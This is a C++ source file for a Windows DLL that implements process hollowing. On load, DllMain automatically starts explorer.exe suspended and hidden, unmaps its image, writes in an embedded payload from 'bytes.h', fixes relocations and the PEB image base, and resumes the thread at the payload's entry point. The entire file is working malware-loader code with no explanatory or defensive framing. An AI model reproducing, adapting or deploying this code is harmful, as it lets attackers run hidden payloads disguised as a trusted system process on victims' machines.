#include "bytes.h"
#include <Windows.h>
#include <winternl.h>
#include <TlHelp32.h>
#include <iostream>
#include <vector>
#include <string>
#include <cstdlib>

typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);
typedef NTSTATUS(NTAPI* pNtQueryInformationProcess)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);

class muriteste {
private:
    HANDLE hTargetProcess;
    HANDLE hTargetThread;
    PROCESS_INFORMATION pi;
    pNtUnmapViewOfSection NtUnmapViewOfSection;
    pNtQueryInformationProcess NtQueryInformationProcess;
    
public:
    muriteste() : hTargetProcess(NULL), hTargetThread(NULL) {
        HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
        if (hNtdll) {
            NtUnmapViewOfSection = (pNtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");
            NtQueryInformationProcess = (pNtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");
        }
    }
    
    bool criarholl(const wchar_t* targetPath, BYTE* payload, SIZE_T payloadSize) {
        
        STARTUPINFO si = { sizeof(si) };
        ZeroMemory(&si, sizeof(si));
        ZeroMemory(&pi, sizeof(pi));
        
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE; 
        
        if (!CreateProcess(targetPath, NULL, NULL, NULL, FALSE, 
                          CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            return false;
        }
        
        hTargetProcess = pi.hProcess;
        hTargetThread = pi.hThread;
        
        CONTEXT ctx;
        ctx.ContextFlags = CONTEXT_FULL;
        if (!GetThreadContext(hTargetThread, &ctx)) {
            TerminateProcess(hTargetProcess, 0);
            return false;
        }
        
        PROCESS_BASIC_INFORMATION pbi;
        if (!NtQueryInformationProcess || 
            NtQueryInformationProcess(hTargetProcess, ProcessBasicInformation, 
                                    &pbi, sizeof(pbi), NULL) != 0) {
            TerminateProcess(hTargetProcess, 0);
            return false;
        }
        
        LPVOID imageBase;
        SIZE_T bytesRead;
        if (!ReadProcessMemory(hTargetProcess, 
                              (LPVOID)((LPBYTE)pbi.PebBaseAddress + 0x10), 
                              &imageBase, sizeof(imageBase), &bytesRead)) {
            TerminateProcess(hTargetProcess, 0);
            return false;
        }
        
        if (!NtUnmapViewOfSection || 
            NtUnmapViewOfSection(hTargetProcess, imageBase) != 0) {
            TerminateProcess(hTargetProcess, 0);
            return false;
        }
        
        IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)payload;
        if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
            TerminateProcess(hTargetProcess, 0);
            return false;
        }
        
        IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)((LPBYTE)payload + dosHeader->e_lfanew);
        if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
            TerminateProcess(hTargetProcess, 0);
            return false;
        }
        
        LPVOID newImageBase = VirtualAllocEx(hTargetProcess, 
                                           (LPVOID)ntHeaders->OptionalHeader.ImageBase, 
                                           ntHeaders->OptionalHeader.SizeOfImage, 
                                           MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        
        if (!newImageBase) {
            newImageBase = VirtualAllocEx(hTargetProcess, NULL, 
                                        ntHeaders->OptionalHeader.SizeOfImage, 
                                        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (!newImageBase) {
                TerminateProcess(hTargetProcess, 0);
                return false;
            }
        }
        
        if (!WriteProcessMemory(hTargetProcess, newImageBase, payload, 
                               ntHeaders->OptionalHeader.SizeOfHeaders, NULL)) {
            TerminateProcess(hTargetProcess, 0);
            return false;
        }
        
        IMAGE_SECTION_HEADER* sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
        for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
            if (sectionHeader[i].SizeOfRawData > 0) {
                if (!WriteProcessMemory(hTargetProcess, 
                                       (LPVOID)((LPBYTE)newImageBase + sectionHeader[i].VirtualAddress), 
                                       (LPVOID)((LPBYTE)payload + sectionHeader[i].PointerToRawData), 
                                       sectionHeader[i].SizeOfRawData, NULL)) {
                    TerminateProcess(hTargetProcess, 0);
                    return false;
                }
            }
        }
        
        if (newImageBase != (LPVOID)ntHeaders->OptionalHeader.ImageBase) {
            DWORD_PTR deltaImageBase = (DWORD_PTR)newImageBase - ntHeaders->OptionalHeader.ImageBase;
            
            if (ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size > 0) {
                IMAGE_BASE_RELOCATION* relocation = (IMAGE_BASE_RELOCATION*)((LPBYTE)payload + 
                    ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
                
                while (relocation->VirtualAddress > 0) {
                    WORD* relocInfo = (WORD*)((LPBYTE)relocation + sizeof(IMAGE_BASE_RELOCATION));
                    int relocCount = (relocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                    
                    for (int i = 0; i < relocCount; i++) {
                        if ((relocInfo[i] >> 12) == IMAGE_REL_BASED_HIGHLOW || 
                            (relocInfo[i] >> 12) == IMAGE_REL_BASED_DIR64) {
                            
                            DWORD_PTR* patchAddr = (DWORD_PTR*)((LPBYTE)newImageBase + 
                                relocation->VirtualAddress + (relocInfo[i] & 0xFFF));
                            
                            DWORD_PTR originalValue;
                            if (ReadProcessMemory(hTargetProcess, patchAddr, &originalValue, sizeof(originalValue), NULL)) {
                                DWORD_PTR newValue = originalValue + deltaImageBase;
                                WriteProcessMemory(hTargetProcess, patchAddr, &newValue, sizeof(newValue), NULL);
                            }
                        }
                    }
                    
                    relocation = (IMAGE_BASE_RELOCATION*)((LPBYTE)relocation + relocation->SizeOfBlock);
                }
            }
        }
        
        if (!WriteProcessMemory(hTargetProcess, 
                               (LPVOID)((LPBYTE)pbi.PebBaseAddress + 0x10), 
                               &newImageBase, sizeof(newImageBase), NULL)) {
            TerminateProcess(hTargetProcess, 0);
            return false;
        }
        
#ifdef _WIN64
        ctx.Rcx = (DWORD64)newImageBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
#else
        ctx.Eax = (DWORD)newImageBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
#endif
        
        if (!SetThreadContext(hTargetThread, &ctx)) {
            TerminateProcess(hTargetProcess, 0);
            return false;
        }
        
        sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
        for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
            DWORD protection = PAGE_READONLY;
            
            if (sectionHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
                if (sectionHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE) {
                    protection = PAGE_EXECUTE_READWRITE;
                } else {
                    protection = PAGE_EXECUTE_READ;
                }
            } else if (sectionHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE) {
                protection = PAGE_READWRITE;
            }
            
            DWORD oldProtection;
            VirtualProtectEx(hTargetProcess, 
                           (LPVOID)((LPBYTE)newImageBase + sectionHeader[i].VirtualAddress),
                           sectionHeader[i].Misc.VirtualSize, protection, &oldProtection);
        }
        
        if (ResumeThread(hTargetThread) == -1) {
            TerminateProcess(hTargetProcess, 0);
            return false;
        }
        
        return true;
    }
    
    void ret() {
        if (hTargetProcess) {
            CloseHandle(hTargetProcess);
            hTargetProcess = NULL;
        }
        if (hTargetThread) {
            CloseHandle(hTargetThread);
            hTargetThread = NULL;
        }
    }
    
    DWORD GetProcessId() {
        return pi.dwProcessId;
    }
    
    DWORD GetThreadId() {
        return pi.dwThreadId;
    }
};

std::wstring injetar() {
    wchar_t windowsDir[MAX_PATH];
    GetWindowsDirectory(windowsDir, MAX_PATH);
    return std::wstring(windowsDir) + L"\\explorer.exe";
}

extern "C" __declspec(dllexport) BOOL rodahollo() {
    muriteste hollower;
    std::wstring explorerPath = injetar();
    
    if (hollower.criarholl(explorerPath.c_str(), payload, sizeof(payload))) {
        Sleep(5000);
        hollower.ret();
        return TRUE;
    }
    
    hollower.ret();
    return FALSE;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        rodahollo();
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
